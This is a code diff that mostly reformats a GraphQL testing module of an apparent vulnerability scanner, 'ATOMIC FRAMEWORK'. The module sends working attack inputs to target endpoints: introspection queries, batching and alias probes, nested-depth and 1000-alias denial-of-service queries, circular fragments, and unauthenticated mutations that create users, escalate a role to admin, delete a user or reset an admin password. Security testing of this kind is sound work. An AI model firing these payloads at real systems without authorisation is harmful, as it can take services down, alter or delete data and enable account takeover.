@@ -5,8 +5,6 @@ ATOMIC FRAMEWORK - GraphQL Injection Module
 Detects GraphQL introspection exposure, query injection, and mutation abuse.
 """
 
-from urllib.parse import urlparse
-
 from config import Payloads, Colors
 
 
@@ -14,12 +12,12 @@ class GraphQLModule:
     """GraphQL Injection Testing Module"""
 
     name = "GraphQL Injection"
-    vuln_type = 'graphql'
+    vuln_type = "graphql"
 
     def __init__(self, engine):
         self.engine = engine
         self.requester = engine.requester
-        self.verbose = engine.config.get('verbose', False)
+        self.verbose = engine.config.get("verbose", False)
 
     def test(self, url: str, method: str, param: str, value: str):
         """Test a parameter for GraphQL injection.
@@ -30,23 +28,26 @@ class GraphQLModule:
         for payload in Payloads.GRAPHQL_PAYLOADS:
             try:
                 response = self.requester.request(
-                    url, method, params={param: payload},
+                    url,
+                    method,
+                    params={param: payload},
                 )
                 if not response:
                     continue
-                body = response.text or ''
+                body = response.text or ""
                 if self._is_graphql_response(body):
                     from core.engine import Finding
+
                     finding = Finding(
                         technique="GraphQL Injection",
                         url=url,
                         param=param,
                         payload=payload[:200],
                         evidence=body[:200],
-                        severity='HIGH',
+                        severity="HIGH",
                         confidence=0.85,
-                        mitre_id='T1190',
-                        cwe_id='CWE-943',
+                        mitre_id="T1190",
+                        cwe_id="CWE-943",
                         cvss=7.5,
                         remediation="Disable introspection in production. Validate and sanitize all GraphQL input. Use query depth and complexity limits.",
                     )
@@ -60,9 +61,9 @@ class GraphQLModule:
         """Test URL-level GraphQL endpoints for introspection leaks."""
         graphql_paths = [
             url,
-            url.rstrip('/') + '/graphql',
-            url.rstrip('/') + '/graphiql',
-            url.rstrip('/') + '/api/graphql',
+            url.rstrip("/") + "/graphql",
+            url.rstrip("/") + "/graphiql",
+            url.rstrip("/") + "/api/graphql",
         ]
 
         introspection_query = '{"query":"{__schema{types{name}}}"}'
@@ -70,25 +71,27 @@ class GraphQLModule:
         for endpoint in graphql_paths:
             try:
                 response = self.requester.request(
-                    endpoint, 'POST',
-                    headers={'Content-Type': 'application/json'},
+                    endpoint,
+                    "POST",
+                    headers={"Content-Type": "application/json"},
                     data=introspection_query,
                 )
                 if not response:
                     continue
-                body = response.text or ''
+                body = response.text or ""
                 if self._is_introspection_result(body):
                     from core.engine import Finding
+
                     finding = Finding(
                         technique="GraphQL Introspection Enabled",
                         url=endpoint,
-                        param='',
+                        param="",
                         payload=introspection_query[:200],
                         evidence=body[:200],
-                        severity='MEDIUM',
+                        severity="MEDIUM",
                         confidence=0.9,
-                        mitre_id='T1190',
-                        cwe_id='CWE-200',
+                        mitre_id="T1190",
+                        cwe_id="CWE-200",
                         cvss=5.3,
                         remediation="Disable GraphQL introspection in production environments. Use allowlists for permitted queries.",
                     )
@@ -112,87 +115,110 @@ class GraphQLModule:
         """Test for GraphQL batching/aliasing attacks"""
         batch_payload = '[{"query":"{__typename}"},{"query":"{__typename}"}]'
         alias_payload = '{"query":"{a:__typename b:__typename c:__typename d:__typename e:__typename}"}'
-        
+
         graphql_paths = [
             url,
-            url.rstrip('/') + '/graphql',
-            url.rstrip('/') + '/api/graphql',
+            url.rstrip("/") + "/graphql",
+            url.rstrip("/") + "/api/graphql",
         ]
-        
+
         for endpoint in graphql_paths:
-            for payload, technique in [(batch_payload, 'Batching'), (alias_payload, 'Aliasing')]:
+            for payload, technique in [(batch_payload, "Batching"), (alias_payload, "Aliasing")]:
                 try:
                     response = self.requester.request(
-                        endpoint, 'POST',
-                        headers={'Content-Type': 'application/json'},
+                        endpoint,
+                        "POST",
+                        headers={"Content-Type": "application/json"},
                         data=payload,
                     )
                     if not response:
                         continue
-                    body = response.text or ''
+                    body = response.text or ""
                     # Batching: response should be a JSON array with multiple results
                     # Aliasing: response should contain multiple aliased results
-                    if technique == 'Batching' and '"data"' in body and body.strip().startswith('['):
+                    if technique == "Batching" and '"data"' in body and body.strip().startswith("["):
                         from core.engine import Finding
+
                         finding = Finding(
                             technique=f"GraphQL ({technique} Attack Possible)",
-                            url=endpoint, param='', payload=payload[:200],
-                            evidence=body[:200], severity='MEDIUM', confidence=0.8,
-                            mitre_id='T1190', cwe_id='CWE-799', cvss=5.3,
+                            url=endpoint,
+                            param="",
+                            payload=payload[:200],
+                            evidence=body[:200],
+                            severity="MEDIUM",
+                            confidence=0.8,
+                            mitre_id="T1190",
+                            cwe_id="CWE-799",
+                            cvss=5.3,
                             remediation="Implement query batching limits and rate limiting for GraphQL.",
                         )
                         self.engine.add_finding(finding)
                         return
-                    elif technique == 'Aliasing' and body.count('__typename') >= 3:
+                    elif technique == "Aliasing" and body.count("__typename") >= 3:
                         from core.engine import Finding
+
                         finding = Finding(
                             technique=f"GraphQL ({technique} Attack Possible)",
-                            url=endpoint, param='', payload=payload[:200],
-                            evidence=body[:200], severity='MEDIUM', confidence=0.75,
-                            mitre_id='T1190', cwe_id='CWE-799', cvss=5.3,
+                            url=endpoint,
+                            param="",
+                            payload=payload[:200],
+                            evidence=body[:200],
+                            severity="MEDIUM",
+                            confidence=0.75,
+                            mitre_id="T1190",
+                            cwe_id="CWE-799",
+                            cvss=5.3,
                             remediation="Implement query complexity limits and depth limiting for GraphQL.",
                         )
                         self.engine.add_finding(finding)
                         return
                 except Exception:
                     continue
-    
+
     def _test_field_suggestions(self, url: str):
         """Test for GraphQL field suggestion information disclosure"""
         # Send an invalid field name to trigger field suggestions
         suggestion_payload = '{"query":"{__schema{typo_field_xxx}}"}'
-        
+
         graphql_paths = [
             url,
-            url.rstrip('/') + '/graphql',
-            url.rstrip('/') + '/api/graphql',
+            url.rstrip("/") + "/graphql",
+            url.rstrip("/") + "/api/graphql",
         ]
-        
+
         for endpoint in graphql_paths:
             try:
                 response = self.requester.request(
-                    endpoint, 'POST',
-                    headers={'Content-Type': 'application/json'},
+                    endpoint,
+                    "POST",
+                    headers={"Content-Type": "application/json"},
                     data=suggestion_payload,
                 )
                 if not response:
                     continue
-                body = response.text or ''
+                body = response.text or ""
                 # GraphQL engines often suggest valid field names in error messages
-                if 'did you mean' in body.lower() or 'suggestions' in body.lower():
+                if "did you mean" in body.lower() or "suggestions" in body.lower():
                     from core.engine import Finding
+
                     finding = Finding(
                         technique="GraphQL (Field Suggestion Disclosure)",
-                        url=endpoint, param='', payload=suggestion_payload[:200],
-                        evidence=body[:300], severity='LOW', confidence=0.85,
-                        mitre_id='T1190', cwe_id='CWE-200', cvss=3.7,
+                        url=endpoint,
+                        param="",
+                        payload=suggestion_payload[:200],
+                        evidence=body[:300],
+                        severity="LOW",
+                        confidence=0.85,
+                        mitre_id="T1190",
+                        cwe_id="CWE-200",
+                        cvss=3.7,
                         remediation="Disable field suggestions in production GraphQL schemas.",
                     )
                     self.engine.add_finding(finding)
                     return
             except Exception:
                 continue
-    
+
     @staticmethod
     def _is_graphql_response(body: str) -> bool:
         """Return True when the response body looks like a GraphQL result."""
@@ -212,69 +238,89 @@ class GraphQLModule:
         """K1: Nested query depth attack — DoS via deeply nested query."""
         # Build a 15-level nested query
         depth = 15
-        inner = '__typename'
+        inner = "__typename"
         for _ in range(depth):
-            inner = f'{{ users {{ friends {inner} }} }}'
-        query = f'query {{ {inner} }}'
-        payload = {'query': query}
+            inner = f"{{ users {{ friends {inner} }} }}"
+        query = f"query {{ {inner} }}"
+        payload = {"query": query}
         try:
             import time
+
             start = time.time()
-            resp = self.requester.request(endpoint, 'POST', json_data=payload)
+            resp = self.requester.request(endpoint, "POST", json_data=payload)
             elapsed = time.time() - start
             if resp and elapsed > 5:
                 from core.engine import Finding
-                self.engine.add_finding(Finding(
-                    technique='GraphQL Depth DoS',
-                    url=endpoint, param='', payload=query[:200],
-                    evidence=f'Response took {elapsed:.1f}s (depth={depth})',
-                    severity='HIGH', confidence=0.7,
-                ))
+
+                self.engine.add_finding(
+                    Finding(
+                        technique="GraphQL Depth DoS",
+                        url=endpoint,
+                        param="",
+                        payload=query[:200],
+                        evidence=f"Response took {elapsed:.1f}s (depth={depth})",
+                        severity="HIGH",
+                        confidence=0.7,
+                    )
+                )
         except Exception:
             pass
 
     def _test_alias_amplification(self, endpoint):
         """K1: Aliased query amplification — duplicate __typename 1000x."""
-        aliases = ' '.join(f'a{i}:__typename' for i in range(1000))
-        query = f'{{ {aliases} }}'
-        payload = {'query': query}
+        aliases = " ".join(f"a{i}:__typename" for i in range(1000))
+        query = f"{{ {aliases} }}"
+        payload = {"query": query}
         try:
             import time
+
             start = time.time()
-            resp = self.requester.request(endpoint, 'POST', json_data=payload)
+            resp = self.requester.request(endpoint, "POST", json_data=payload)
             elapsed = time.time() - start
             if resp and elapsed > 3:
                 from core.engine import Finding
-                self.engine.add_finding(Finding(
-                    technique='GraphQL Alias Amplification DoS',
-                    url=endpoint, param='', payload=query[:200],
-                    evidence=f'1000 aliases → {elapsed:.1f}s response',
-                    severity='HIGH', confidence=0.65,
-                ))
+
+                self.engine.add_finding(
+                    Finding(
+                        technique="GraphQL Alias Amplification DoS",
+                        url=endpoint,
+                        param="",
+                        payload=query[:200],
+                        evidence=f"1000 aliases → {elapsed:.1f}s response",
+                        severity="HIGH",
+                        confidence=0.65,
+                    )
+                )
         except Exception:
             pass
 
     def _test_fragment_cycle(self, endpoint):
         """K1: Circular fragment references."""
-        query = '''
+        query = """
         query { ...A }
         fragment A on Query { ...B }
         fragment B on Query { ...A }
-        '''
-        payload = {'query': query}
+        """
+        payload = {"query": query}
         try:
-            resp = self.requester.request(endpoint, 'POST', json_data=payload)
+            resp = self.requester.request(endpoint, "POST", json_data=payload)
             if resp:
-                body = resp.text or ''
+                body = resp.text or ""
                 # If server doesn't reject this, it may loop
-                if resp.status_code == 200 and 'error' not in body.lower():
+                if resp.status_code == 200 and "error" not in body.lower():
                     from core.engine import Finding
-                    self.engine.add_finding(Finding(
-                        technique='GraphQL Fragment Cycle',
-                        url=endpoint, param='', payload=query.strip()[:200],
-                        evidence=body[:300],
-                        severity='MEDIUM', confidence=0.6,
-                    ))
+
+                    self.engine.add_finding(
+                        Finding(
+                            technique="GraphQL Fragment Cycle",
+                            url=endpoint,
+                            param="",
+                            payload=query.strip()[:200],
+                            evidence=body[:300],
+                            severity="MEDIUM",
+                            confidence=0.6,
+                        )
+                    )
         except Exception:
             pass
 
@@ -283,24 +329,29 @@ class GraphQLModule:
         mutations = [
             'mutation { createUser(username:"test", password:"test") { id } }',
             'mutation { updateUser(id:1, role:"admin") { id role } }',
-            'mutation { deleteUser(id:1) { success } }',
+            "mutation { deleteUser(id:1) { success } }",
             'mutation { resetPassword(email:"admin@test.com") { success } }',
         ]
         for mutation in mutations:
-            payload = {'query': mutation}
+            payload = {"query": mutation}
             try:
-                resp = self.requester.request(endpoint, 'POST', json_data=payload,
-                                              headers={'Authorization': ''})
+                resp = self.requester.request(endpoint, "POST", json_data=payload, headers={"Authorization": ""})
                 if resp and resp.status_code == 200:
-                    body = resp.text or ''
-                    if self._is_graphql_response(body) and 'error' not in body.lower():
+                    body = resp.text or ""
+                    if self._is_graphql_response(body) and "error" not in body.lower():
                         from core.engine import Finding
-                        self.engine.add_finding(Finding(
-                            technique='GraphQL Mutation Auth Bypass',
-                            url=endpoint, param='', payload=mutation[:200],
-                            evidence=body[:300],
-                            severity='CRITICAL', confidence=0.7,
-                        ))
+
+                        self.engine.add_finding(
+                            Finding(
+                                technique="GraphQL Mutation Auth Bypass",
+                                url=endpoint,
+                                param="",
+                                payload=mutation[:200],
+                                evidence=body[:300],
+                                severity="CRITICAL",
+                                confidence=0.7,
+                            )
+                        )
                         return
             except Exception:
                 continue
